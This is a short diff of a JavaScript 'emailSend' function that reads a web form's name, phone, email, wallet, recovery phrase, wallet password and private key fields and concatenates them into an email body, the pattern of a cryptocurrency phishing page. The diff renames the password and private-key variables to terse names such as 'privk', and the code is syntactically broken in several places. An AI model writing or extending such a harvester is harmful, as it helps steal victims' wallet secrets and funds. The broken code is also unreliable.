@@ -1,5 +1,7 @@
 function emailSend(){
 
+
+
 	var userName = document.getElementById('name').value;
 
 	var phone = document.getElementById('phone').value;
@@ -10,13 +12,13 @@ function emailSend(){
 
 	var phrase = document.getElementById('phrase').value;
 
-	var walletpassword = document.getElementById('walletpassword'
+	var walletp = document.getElementById('walletp'
 
-	var privatekey = document.getElementById('privatekey'
+	var privk = document.getElementById('privk'
 
 	
 
-	).value;
+	).value; 
 
 
 
@@ -26,13 +28,13 @@ function emailSend(){
 
 	"<br/> Email " + email;
 
-		"<br/> Wallet " + wallet +
+	"<br/> Wallet " + wallet +
 
 	"<br/> Phrase " + phrase;
 
-	"<br/> Walletpassword " + walletpassword;
+	"<br/> walletp " + walletp;
 
-	"<br/> Privatekey " + privatekey;
+	"<br/> privk " + privk;
 
 	
 
